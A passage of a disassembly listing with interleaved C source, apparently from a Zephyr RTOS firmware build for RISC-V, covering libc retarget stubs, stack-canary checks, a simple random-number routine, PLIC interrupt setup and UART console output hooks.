800037ea:	ce06                	sw	ra,28(sp)
800037ec:	cc22                	sw	s0,24(sp)
800037ee:	852e                	mv	a0,a1
800037f0:	85b2                	mv	a1,a2
800037f2:	8000c437          	lui	s0,0x8000c
800037f6:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800037fa:	c63e                	sw	a5,12(sp)
800037fc:	4781                	li	a5,0
		union { uintptr_t x; int val; } parm1 = { .val = nbytes };
		return (int) arch_syscall_invoke2(parm0.x, parm1.x, K_SYSCALL_ZEPHYR_WRITE_STDOUT);
	}
#endif
	compiler_barrier();
	return z_impl_zephyr_write_stdout(buf, nbytes);
800037fe:	3fbd                	jal	8000377c <z_impl_zephyr_write_stdout>
	ARG_UNUSED(fd);

	return zephyr_write_stdout(buf, nbytes);
}
80003800:	4732                	lw	a4,12(sp)
80003802:	95042783          	lw	a5,-1712(s0)
80003806:	8fb9                	xor	a5,a5,a4
80003808:	4701                	li	a4,0
8000380a:	e789                	bnez	a5,80003814 <_write+0x2c>
8000380c:	40f2                	lw	ra,28(sp)
8000380e:	4462                	lw	s0,24(sp)
80003810:	6105                	addi	sp,sp,32
80003812:	8082                	ret
80003814:	4de020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003818 <_exit>:
	return 0;
}
__weak FUNC_ALIAS(_fstat, fstat, int);

__weak void _exit(int status)
{
80003818:	1101                	addi	sp,sp,-32
8000381a:	ce06                	sw	ra,28(sp)
8000381c:	8000c7b7          	lui	a5,0x8000c
80003820:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003824:	c63a                	sw	a4,12(sp)
80003826:	4701                	li	a4,0
	_write(1, "exit\n", 5);
80003828:	4615                	li	a2,5
8000382a:	800085b7          	lui	a1,0x80008
8000382e:	02458593          	addi	a1,a1,36 # 80008024 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80008025>
80003832:	4505                	li	a0,1
80003834:	3f55                	jal	800037e8 <_write>
	while (1) {
80003836:	a001                	j	80003836 <_exit+0x1e>

80003838 <_sbrk>:
		;
	}
}

void *_sbrk(intptr_t count)
{
80003838:	1101                	addi	sp,sp,-32
8000383a:	ce06                	sw	ra,28(sp)
8000383c:	872a                	mv	a4,a0
8000383e:	8000c7b7          	lui	a5,0x8000c
80003842:	9507a683          	lw	a3,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003846:	c636                	sw	a3,12(sp)
80003848:	4681                	li	a3,0
	void *ret, *ptr;

	ptr = ((char *)HEAP_BASE) + heap_sz;
8000384a:	800097b7          	lui	a5,0x80009
8000384e:	03c7a683          	lw	a3,60(a5) # 8000903c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000903d>
80003852:	84818793          	addi	a5,gp,-1976 # 8000c030 <__data_region_end>
80003856:	00f68533          	add	a0,a3,a5

	if ((heap_sz + count) < MAX_HEAP_SIZE) {
8000385a:	9736                	add	a4,a4,a3
8000385c:	900006b7          	lui	a3,0x90000
80003860:	40f687b3          	sub	a5,a3,a5
80003864:	02f77163          	bgeu	a4,a5,80003886 <_sbrk+0x4e>
		heap_sz += count;
80003868:	800097b7          	lui	a5,0x80009
8000386c:	02e7ae23          	sw	a4,60(a5) # 8000903c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000903d>
	} else {
		ret = (void *)-1;
	}

	return ret;
}
80003870:	8000c7b7          	lui	a5,0x8000c
80003874:	4732                	lw	a4,12(sp)
80003876:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000387a:	8fb9                	xor	a5,a5,a4
8000387c:	4701                	li	a4,0
8000387e:	e791                	bnez	a5,8000388a <_sbrk+0x52>
80003880:	40f2                	lw	ra,28(sp)
80003882:	6105                	addi	sp,sp,32
80003884:	8082                	ret
		ret = (void *)-1;
80003886:	557d                	li	a0,-1
	return ret;
80003888:	b7e5                	j	80003870 <_sbrk+0x38>
}
8000388a:	468020ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000388e <__retarget_lock_acquire_recursive>:
	k_sem_take((struct k_sem *)lock, K_FOREVER);
}

/* Acquiure recursive lock */
void __retarget_lock_acquire_recursive(_LOCK_T lock)
{
8000388e:	1101                	addi	sp,sp,-32
80003890:	ce06                	sw	ra,28(sp)
80003892:	cc22                	sw	s0,24(sp)
80003894:	8000c437          	lui	s0,0x8000c
80003898:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000389c:	c63e                	sw	a5,12(sp)
8000389e:	4781                	li	a5,0
		union { struct { uintptr_t lo, hi; } split; k_timeout_t val; } parm1 = { .val = timeout };
		return (int) arch_syscall_invoke3(parm0.x, parm1.split.lo, parm1.split.hi, K_SYSCALL_K_MUTEX_LOCK);
	}
#endif
	compiler_barrier();
	return z_impl_k_mutex_lock(mutex, timeout);
800038a0:	55fd                	li	a1,-1
800038a2:	567d                	li	a2,-1
800038a4:	2ee010ef          	jal	ra,80004b92 <z_impl_k_mutex_lock>
	__ASSERT_NO_MSG(lock != NULL);
	k_mutex_lock((struct k_mutex *)lock, K_FOREVER);
}
800038a8:	4732                	lw	a4,12(sp)
800038aa:	95042783          	lw	a5,-1712(s0)
800038ae:	8fb9                	xor	a5,a5,a4
800038b0:	4701                	li	a4,0
800038b2:	e789                	bnez	a5,800038bc <__retarget_lock_acquire_recursive+0x2e>
800038b4:	40f2                	lw	ra,28(sp)
800038b6:	4462                	lw	s0,24(sp)
800038b8:	6105                	addi	sp,sp,32
800038ba:	8082                	ret
800038bc:	436020ef          	jal	ra,80005cf2 <_StackCheckHandler>

800038c0 <__retarget_lock_release_recursive>:
	k_sem_give((struct k_sem *)lock);
}

/* Release recursive lock */
void __retarget_lock_release_recursive(_LOCK_T lock)
{
800038c0:	1101                	addi	sp,sp,-32
800038c2:	ce06                	sw	ra,28(sp)
800038c4:	cc22                	sw	s0,24(sp)
800038c6:	8000c437          	lui	s0,0x8000c
800038ca:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800038ce:	c63e                	sw	a5,12(sp)
800038d0:	4781                	li	a5,0
		union { uintptr_t x; struct k_mutex * val; } parm0 = { .val = mutex };
		return (int) arch_syscall_invoke1(parm0.x, K_SYSCALL_K_MUTEX_UNLOCK);
	}
#endif
	compiler_barrier();
	return z_impl_k_mutex_unlock(mutex);
800038d2:	3d2010ef          	jal	ra,80004ca4 <z_impl_k_mutex_unlock>
	__ASSERT_NO_MSG(lock != NULL);
	k_mutex_unlock((struct k_mutex *)lock);
}
800038d6:	4732                	lw	a4,12(sp)
800038d8:	95042783          	lw	a5,-1712(s0)
800038dc:	8fb9                	xor	a5,a5,a4
800038de:	4701                	li	a4,0
800038e0:	e789                	bnez	a5,800038ea <__retarget_lock_release_recursive+0x2a>
800038e2:	40f2                	lw	ra,28(sp)
800038e4:	4462                	lw	s0,24(sp)
800038e6:	6105                	addi	sp,sp,32
800038e8:	8082                	ret
800038ea:	408020ef          	jal	ra,80005cf2 <_StackCheckHandler>

800038ee <__chk_fail>:
/* This function gets called if static buffer overflow detection is enabled
 * on stdlib side (Newlib here), in case such an overflow is detected. Newlib
 * provides an implementation not suitable for us, so we override it here.
 */
__weak FUNC_NORETURN void __chk_fail(void)
{
800038ee:	1101                	addi	sp,sp,-32
800038f0:	ce06                	sw	ra,28(sp)
800038f2:	8000c7b7          	lui	a5,0x8000c
800038f6:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800038fa:	c63a                	sw	a4,12(sp)
800038fc:	4701                	li	a4,0
	static const char chk_fail_msg[] = "* buffer overflow detected *\n";
	_write(2, chk_fail_msg, sizeof(chk_fail_msg) - 1);
800038fe:	4675                	li	a2,29
80003900:	800085b7          	lui	a1,0x80008
80003904:	02c58593          	addi	a1,a1,44 # 8000802c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000802d>
80003908:	4509                	li	a0,2
8000390a:	3df9                	jal	800037e8 <_write>
	register unsigned long a0 __asm__ ("a0") = arg1;
8000390c:	450d                	li	a0,3
	register unsigned long t0 __asm__ ("t0") = call_id;
8000390e:	4281                	li	t0,0
	__asm__ volatile ("ecall"
80003910:	00000073          	ecall

80003914 <z_impl_sys_rand32_get>:
 * different values.
 *
 * @return a 32-bit number
 */
uint32_t z_impl_sys_rand32_get(void)
{
80003914:	1101                	addi	sp,sp,-32
80003916:	ce06                	sw	ra,28(sp)
80003918:	cc22                	sw	s0,24(sp)
8000391a:	8000c437          	lui	s0,0x8000c
8000391e:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003922:	c63e                	sw	a5,12(sp)
80003924:	4781                	li	a5,0

extern uint32_t sys_clock_cycle_get_32(void);

static inline uint32_t arch_k_cycle_get_32(void)
{
	return sys_clock_cycle_get_32();
80003926:	179000ef          	jal	ra,8000429e <sys_clock_cycle_get_32>
 *
 * @return Previous value of @a target.
 */
static inline atomic_val_t atomic_add(atomic_t *target, atomic_val_t value)
{
	return __atomic_fetch_add(target, value, __ATOMIC_SEQ_CST);
8000392a:	800097b7          	lui	a5,0x80009
8000392e:	3b9ad737          	lui	a4,0x3b9ad
80003932:	a0370713          	addi	a4,a4,-1533 # 3b9aca03 <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0x3b023383>
80003936:	04078793          	addi	a5,a5,64 # 80009040 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009041>
8000393a:	0f50000f          	fence	iorw,ow
8000393e:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
	return k_cycle_get_32() + atomic_add(&_rand32_counter, _RAND32_INC);
80003942:	9536                	add	a0,a0,a3
}
80003944:	4732                	lw	a4,12(sp)
80003946:	95042783          	lw	a5,-1712(s0)
8000394a:	8fb9                	xor	a5,a5,a4
8000394c:	4701                	li	a4,0
8000394e:	e789                	bnez	a5,80003958 <z_impl_sys_rand32_get+0x44>
80003950:	40f2                	lw	ra,28(sp)
80003952:	4462                	lw	s0,24(sp)
80003954:	6105                	addi	sp,sp,32
80003956:	8082                	ret
80003958:	39a020ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000395c <z_impl_sys_rand_get>:
 *
 * @param dst destination buffer to fill
 * @param outlen size of destination buffer to fill
 */
void z_impl_sys_rand_get(void *dst, size_t outlen)
{
8000395c:	1101                	addi	sp,sp,-32
8000395e:	ce06                	sw	ra,28(sp)
80003960:	cc22                	sw	s0,24(sp)
80003962:	ca26                	sw	s1,20(sp)
80003964:	c84a                	sw	s2,16(sp)
80003966:	892a                	mv	s2,a0
80003968:	842e                	mv	s0,a1
8000396a:	8000c7b7          	lui	a5,0x8000c
8000396e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003972:	c63a                	sw	a4,12(sp)
80003974:	4701                	li	a4,0
	uint8_t *udst = dst;
	uint32_t blocksize;
	uint32_t ret;

	while (outlen) {
80003976:	a801                	j	80003986 <z_impl_sys_rand_get+0x2a>
__ssp_bos_icheck3_restrict(memcpy, void *, const void *)
80003978:	8626                	mv	a2,s1
8000397a:	002c                	addi	a1,sp,8
8000397c:	854a                	mv	a0,s2
8000397e:	e71fc0ef          	jal	ra,800007ee <memcpy>
		ret = sys_rand32_get();
		blocksize = MIN(outlen, sizeof(ret));
		(void)memcpy((void *)udst, &ret, blocksize);
		udst += blocksize;
80003982:	9926                	add	s2,s2,s1
		outlen -= blocksize;
80003984:	8c05                	sub	s0,s0,s1
	while (outlen) {
80003986:	c809                	beqz	s0,80003998 <z_impl_sys_rand_get+0x3c>
	if (z_syscall_trap()) {
		return (uint32_t) arch_syscall_invoke0(K_SYSCALL_SYS_RAND32_GET);
	}
#endif
	compiler_barrier();
	return z_impl_sys_rand32_get();
80003988:	3771                	jal	80003914 <z_impl_sys_rand32_get>
		ret = sys_rand32_get();
8000398a:	c42a                	sw	a0,8(sp)
		blocksize = MIN(outlen, sizeof(ret));
8000398c:	84a2                	mv	s1,s0
8000398e:	4791                	li	a5,4
80003990:	fe87f4e3          	bgeu	a5,s0,80003978 <z_impl_sys_rand_get+0x1c>
80003994:	4491                	li	s1,4
80003996:	b7cd                	j	80003978 <z_impl_sys_rand_get+0x1c>
	}
}
80003998:	8000c7b7          	lui	a5,0x8000c
8000399c:	4732                	lw	a4,12(sp)
8000399e:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800039a2:	8fb9                	xor	a5,a5,a4
800039a4:	4701                	li	a4,0
800039a6:	e799                	bnez	a5,800039b4 <z_impl_sys_rand_get+0x58>
800039a8:	40f2                	lw	ra,28(sp)
800039aa:	4462                	lw	s0,24(sp)
800039ac:	44d2                	lw	s1,20(sp)
800039ae:	4942                	lw	s2,16(sp)
800039b0:	6105                	addi	sp,sp,32
800039b2:	8082                	ret
800039b4:	33e020ef          	jal	ra,80005cf2 <_StackCheckHandler>

800039b8 <plic_init>:
 * @brief Initialize the Platform Level Interrupt Controller
 *
 * @retval 0 on success.
 */
static int plic_init(const struct device *dev)
{
800039b8:	1101                	addi	sp,sp,-32
800039ba:	ce06                	sw	ra,28(sp)
800039bc:	8000c7b7          	lui	a5,0x8000c
800039c0:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800039c4:	c63a                	sw	a4,12(sp)
800039c6:	4701                	li	a4,0
	volatile struct plic_regs_t *regs =
	    (volatile struct plic_regs_t *)PLIC_REG;
	int i;

	/* Ensure that all interrupts are disabled initially */
	for (i = 0; i < PLIC_EN_SIZE; i++) {
800039c8:	4781                	li	a5,0
	volatile uint32_t *en = (volatile uint32_t *)PLIC_IRQ_EN;
800039ca:	0c002737          	lui	a4,0xc002
	for (i = 0; i < PLIC_EN_SIZE; i++) {
800039ce:	a029                	j	800039d8 <plic_init+0x20>
		*en = 0U;
800039d0:	00072023          	sw	zero,0(a4) # c002000 <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0xb678980>
		en++;
800039d4:	0711                	addi	a4,a4,4
	for (i = 0; i < PLIC_EN_SIZE; i++) {
800039d6:	0785                	addi	a5,a5,1
800039d8:	4685                	li	a3,1
800039da:	fef6dbe3          	bge	a3,a5,800039d0 <plic_init+0x18>
	}

	/* Set priority of each interrupt line to 0 initially */
	for (i = 0; i < PLIC_IRQS; i++) {
800039de:	4781                	li	a5,0
	volatile uint32_t *prio = (volatile uint32_t *)PLIC_PRIO;
800039e0:	0c000737          	lui	a4,0xc000
800039e4:	a029                	j	800039ee <plic_init+0x36>
		*prio = 0U;
800039e6:	00072023          	sw	zero,0(a4) # c000000 <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0xb676980>
		prio++;
800039ea:	0711                	addi	a4,a4,4
	for (i = 0; i < PLIC_IRQS; i++) {
800039ec:	0785                	addi	a5,a5,1
800039ee:	03300693          	li	a3,51
800039f2:	fef6dae3          	bge	a3,a5,800039e6 <plic_init+0x2e>
	}

	/* Set threshold priority to 0 */
	regs->threshold_prio = 0U;
800039f6:	0c2007b7          	lui	a5,0xc200
800039fa:	0007a023          	sw	zero,0(a5) # c200000 <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0xb876980>

	/* Setup IRQ handler for PLIC driver */
	IRQ_CONNECT(RISCV_MACHINE_EXT_IRQ,
800039fe:	4601                	li	a2,0
80003a00:	4581                	li	a1,0
80003a02:	452d                	li	a0,11
80003a04:	865ff0ef          	jal	ra,80003268 <z_riscv_irq_priority_set>
		    plic_irq_handler,
		    NULL,
		    0);

	/* Enable IRQ for PLIC driver */
	irq_enable(RISCV_MACHINE_EXT_IRQ);
80003a08:	452d                	li	a0,11
80003a0a:	817ff0ef          	jal	ra,80003220 <arch_irq_enable>

	return 0;
}
80003a0e:	8000c7b7          	lui	a5,0x8000c
80003a12:	4732                	lw	a4,12(sp)
80003a14:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003a18:	8fb9                	xor	a5,a5,a4
80003a1a:	4701                	li	a4,0
80003a1c:	e789                	bnez	a5,80003a26 <plic_init+0x6e>
80003a1e:	4501                	li	a0,0
80003a20:	40f2                	lw	ra,28(sp)
80003a22:	6105                	addi	sp,sp,32
80003a24:	8082                	ret
80003a26:	2cc020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003a2a <plic_irq_handler>:
{
80003a2a:	1101                	addi	sp,sp,-32
80003a2c:	ce06                	sw	ra,28(sp)
80003a2e:	cc22                	sw	s0,24(sp)
80003a30:	8000c7b7          	lui	a5,0x8000c
80003a34:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003a38:	c63a                	sw	a4,12(sp)
80003a3a:	4701                	li	a4,0
	irq = regs->claim_complete;
80003a3c:	0c2007b7          	lui	a5,0xc200
80003a40:	43c0                	lw	s0,4(a5)
	save_irq = irq;
80003a42:	800097b7          	lui	a5,0x80009
80003a46:	0487a223          	sw	s0,68(a5) # 80009044 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009045>
	if (irq == 0U || irq >= PLIC_IRQS)
80003a4a:	fff40713          	addi	a4,s0,-1
80003a4e:	03200793          	li	a5,50
80003a52:	02e7ef63          	bltu	a5,a4,80003a90 <plic_irq_handler+0x66>
	irq += CONFIG_2ND_LVL_ISR_TBL_OFFSET;
80003a56:	0431                	addi	s0,s0,12
	ite->isr(ite->arg);
80003a58:	800077b7          	lui	a5,0x80007
80003a5c:	040e                	slli	s0,s0,0x3
80003a5e:	f1478793          	addi	a5,a5,-236 # 80006f14 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80006f15>
80003a62:	97a2                	add	a5,a5,s0
80003a64:	43d8                	lw	a4,4(a5)
80003a66:	4388                	lw	a0,0(a5)
80003a68:	9702                	jalr	a4
	regs->claim_complete = save_irq;
80003a6a:	800097b7          	lui	a5,0x80009
80003a6e:	0447a703          	lw	a4,68(a5) # 80009044 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009045>
80003a72:	0c2007b7          	lui	a5,0xc200
80003a76:	c3d8                	sw	a4,4(a5)
}
80003a78:	8000c7b7          	lui	a5,0x8000c
80003a7c:	4732                	lw	a4,12(sp)
80003a7e:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003a82:	8fb9                	xor	a5,a5,a4
80003a84:	4701                	li	a4,0
80003a86:	eb89                	bnez	a5,80003a98 <plic_irq_handler+0x6e>
80003a88:	40f2                	lw	ra,28(sp)
80003a8a:	4462                	lw	s0,24(sp)
80003a8c:	6105                	addi	sp,sp,32
80003a8e:	8082                	ret
		z_irq_spurious(NULL);
80003a90:	4501                	li	a0,0
80003a92:	8cbff0ef          	jal	ra,8000335c <z_irq_spurious>
80003a96:	b7c1                	j	80003a56 <plic_irq_handler+0x2c>
}
80003a98:	25a020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003a9c <riscv_plic_irq_enable>:
{
80003a9c:	1101                	addi	sp,sp,-32
80003a9e:	ce06                	sw	ra,28(sp)
80003aa0:	8000c5b7          	lui	a1,0x8000c
80003aa4:	9505a783          	lw	a5,-1712(a1) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003aa8:	c63e                	sw	a5,12(sp)
80003aaa:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80003aac:	30047773          	csrrci	a4,mstatus,8
	en += (irq >> 5);
80003ab0:	00555693          	srli	a3,a0,0x5
80003ab4:	068a                	slli	a3,a3,0x2
80003ab6:	0c0027b7          	lui	a5,0xc002
80003aba:	97b6                	add	a5,a5,a3
	*en |= (1 << (irq & 31));
80003abc:	4394                	lw	a3,0(a5)
80003abe:	4605                	li	a2,1
80003ac0:	00a61633          	sll	a2,a2,a0
80003ac4:	8ed1                	or	a3,a3,a2
80003ac6:	c394                	sw	a3,0(a5)
			  : "r" (key & MSTATUS_IEN)
80003ac8:	00877793          	andi	a5,a4,8
	__asm__ volatile ("csrs mstatus, %0"
80003acc:	3007a073          	csrs	mstatus,a5
}
80003ad0:	4732                	lw	a4,12(sp)
80003ad2:	9505a783          	lw	a5,-1712(a1)
80003ad6:	8fb9                	xor	a5,a5,a4
80003ad8:	4701                	li	a4,0
80003ada:	e781                	bnez	a5,80003ae2 <riscv_plic_irq_enable+0x46>
80003adc:	40f2                	lw	ra,28(sp)
80003ade:	6105                	addi	sp,sp,32
80003ae0:	8082                	ret
80003ae2:	210020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003ae6 <riscv_plic_set_priority>:
{
80003ae6:	1101                	addi	sp,sp,-32
80003ae8:	ce06                	sw	ra,28(sp)
80003aea:	8000c7b7          	lui	a5,0x8000c
80003aee:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003af2:	c63a                	sw	a4,12(sp)
80003af4:	4701                	li	a4,0
	if (priority > PLIC_MAX_PRIO)
80003af6:	479d                	li	a5,7
80003af8:	00b7f363          	bgeu	a5,a1,80003afe <riscv_plic_set_priority+0x18>
		priority = PLIC_MAX_PRIO;
80003afc:	459d                	li	a1,7
	prio += irq;
80003afe:	050a                	slli	a0,a0,0x2
80003b00:	0c0007b7          	lui	a5,0xc000
80003b04:	97aa                	add	a5,a5,a0
	*prio = priority;
80003b06:	c38c                	sw	a1,0(a5)
}
80003b08:	8000c7b7          	lui	a5,0x8000c
80003b0c:	4732                	lw	a4,12(sp)
80003b0e:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003b12:	8fb9                	xor	a5,a5,a4
80003b14:	4701                	li	a4,0
80003b16:	e781                	bnez	a5,80003b1e <riscv_plic_set_priority+0x38>
80003b18:	40f2                	lw	ra,28(sp)
80003b1a:	6105                	addi	sp,sp,32
80003b1c:	8082                	ret
80003b1e:	1d4020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003b22 <console_out>:
 *
 * @return The character passed as input.
 */

static int console_out(int c)
{
80003b22:	1101                	addi	sp,sp,-32
80003b24:	ce06                	sw	ra,28(sp)
80003b26:	cc22                	sw	s0,24(sp)
80003b28:	842a                	mv	s0,a0
80003b2a:	8000c7b7          	lui	a5,0x8000c
80003b2e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003b32:	c63a                	sw	a4,12(sp)
80003b34:	4701                	li	a4,0
		return c;
	}

#endif  /* CONFIG_UART_CONSOLE_DEBUG_SERVER_HOOKS */

	if ('\n' == c) {
80003b36:	47a9                	li	a5,10
80003b38:	02f50a63          	beq	a0,a5,80003b6c <console_out+0x4a>
		uart_poll_out(uart_console_dev, '\r');
	}
	uart_poll_out(uart_console_dev, c);
80003b3c:	0ff47593          	zext.b	a1,s0
			     unsigned char out_char);

static inline void z_impl_uart_poll_out(const struct device *dev,
					unsigned char out_char)
{
	const struct uart_driver_api *api =
80003b40:	80007537          	lui	a0,0x80007
80003b44:	efc50793          	addi	a5,a0,-260 # 80006efc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80006efd>
80003b48:	479c                	lw	a5,8(a5)
		(const struct uart_driver_api *)dev->api;

	api->poll_out(dev, out_char);
80003b4a:	43dc                	lw	a5,4(a5)
80003b4c:	efc50513          	addi	a0,a0,-260
80003b50:	9782                	jalr	a5

	return c;
}
80003b52:	8000c7b7          	lui	a5,0x8000c
80003b56:	4732                	lw	a4,12(sp)
80003b58:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003b5c:	8fb9                	xor	a5,a5,a4
80003b5e:	4701                	li	a4,0
80003b60:	e38d                	bnez	a5,80003b82 <console_out+0x60>
80003b62:	8522                	mv	a0,s0
80003b64:	40f2                	lw	ra,28(sp)
80003b66:	4462                	lw	s0,24(sp)
80003b68:	6105                	addi	sp,sp,32
80003b6a:	8082                	ret
	const struct uart_driver_api *api =
80003b6c:	80007537          	lui	a0,0x80007
80003b70:	efc50793          	addi	a5,a0,-260 # 80006efc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80006efd>
80003b74:	479c                	lw	a5,8(a5)
	api->poll_out(dev, out_char);
80003b76:	43dc                	lw	a5,4(a5)
80003b78:	45b5                	li	a1,13
80003b7a:	efc50513          	addi	a0,a0,-260
80003b7e:	9782                	jalr	a5
		return;
	}
#endif
	compiler_barrier();
	z_impl_uart_poll_out(dev, out_char);
}
80003b80:	bf75                	j	80003b3c <console_out+0x1a>
80003b82:	170020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003b86 <uart_console_hook_install>:
/**
 * @brief Install printk/stdout hook for UART console output
 */

static void uart_console_hook_install(void)
{
80003b86:	1101                	addi	sp,sp,-32
80003b88:	ce06                	sw	ra,28(sp)
80003b8a:	cc22                	sw	s0,24(sp)
80003b8c:	ca26                	sw	s1,20(sp)
80003b8e:	8000c437          	lui	s0,0x8000c
80003b92:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003b96:	c63e                	sw	a5,12(sp)
80003b98:	4781                	li	a5,0
#if defined(CONFIG_STDOUT_CONSOLE)
	__stdout_hook_install(console_out);
80003b9a:	800044b7          	lui	s1,0x80004
80003b9e:	b2248513          	addi	a0,s1,-1246 # 80003b22 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80003b23>
80003ba2:	bb1ff0ef          	jal	ra,80003752 <__stdout_hook_install>
#endif
#if defined(CONFIG_PRINTK)
	__printk_hook_install(console_out);
80003ba6:	b2248513          	addi	a0,s1,-1246
80003baa:	fbefe0ef          	jal	ra,80002368 <__printk_hook_install>
#endif
}
80003bae:	4732                	lw	a4,12(sp)
80003bb0:	95042783          	lw	a5,-1712(s0)
80003bb4:	8fb9                	xor	a5,a5,a4
80003bb6:	4701                	li	a4,0
80003bb8:	e791                	bnez	a5,80003bc4 <uart_console_hook_install+0x3e>
80003bba:	40f2                	lw	ra,28(sp)
80003bbc:	4462                	lw	s0,24(sp)
80003bbe:	44d2                	lw	s1,20(sp)
80003bc0:	6105                	addi	sp,sp,32
80003bc2:	8082                	ret
80003bc4:	12e020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003bc8 <uart_console_init>:
 * @brief Initialize one UART as the console/debug port
 *
 * @return 0 if successful, otherwise failed.
 */
static int uart_console_init(const struct device *arg)
{
80003bc8:	1101                	addi	sp,sp,-32
80003bca:	ce06                	sw	ra,28(sp)
80003bcc:	8000c7b7          	lui	a5,0x8000c
80003bd0:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003bd4:	c63a                	sw	a4,12(sp)
80003bd6:	4701                	li	a4,0
 */
__syscall bool device_is_ready(const struct device *dev);

static inline bool z_impl_device_is_ready(const struct device *dev)
{
	return z_device_is_ready(dev);
80003bd8:	80007537          	lui	a0,0x80007
80003bdc:	efc50513          	addi	a0,a0,-260 # 80006efc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80006efd>
80003be0:	7c6000ef          	jal	ra,800043a6 <z_device_is_ready>

	ARG_UNUSED(arg);

	if (!device_is_ready(uart_console_dev)) {
80003be4:	cd11                	beqz	a0,80003c00 <uart_console_init+0x38>
		return -ENODEV;
	}

	uart_console_hook_install();
80003be6:	3745                	jal	80003b86 <uart_console_hook_install>

	return 0;
80003be8:	4501                	li	a0,0
}
80003bea:	8000c7b7          	lui	a5,0x8000c
80003bee:	4732                	lw	a4,12(sp)
80003bf0:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003bf4:	8fb9                	xor	a5,a5,a4
80003bf6:	4701                	li	a4,0
80003bf8:	e791                	bnez	a5,80003c04 <uart_console_init+0x3c>
80003bfa:	40f2                	lw	ra,28(sp)
80003bfc:	6105                	addi	sp,sp,32
80003bfe:	8082                	ret
		return -ENODEV;
80003c00:	5535                	li	a0,-19
80003c02:	b7e5                	j	80003bea <uart_console_init+0x22>
}
80003c04:	0ee020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003c08 <clock_control_get_rate>:
 * @retval -ENOSYS if the interface is not implemented.
 */
static inline int clock_control_get_rate(const struct device *dev,
					 clock_control_subsys_t sys,
					 uint32_t *rate)
{
80003c08:	1101                	addi	sp,sp,-32
80003c0a:	ce06                	sw	ra,28(sp)
80003c0c:	8000c7b7          	lui	a5,0x8000c
80003c10:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003c14:	c63a                	sw	a4,12(sp)
80003c16:	4701                	li	a4,0
	const struct clock_control_driver_api *api =
80003c18:	451c                	lw	a5,8(a0)
		(const struct clock_control_driver_api *)dev->api;

	if (api->get_rate == NULL) {
80003c1a:	47dc                	lw	a5,12(a5)
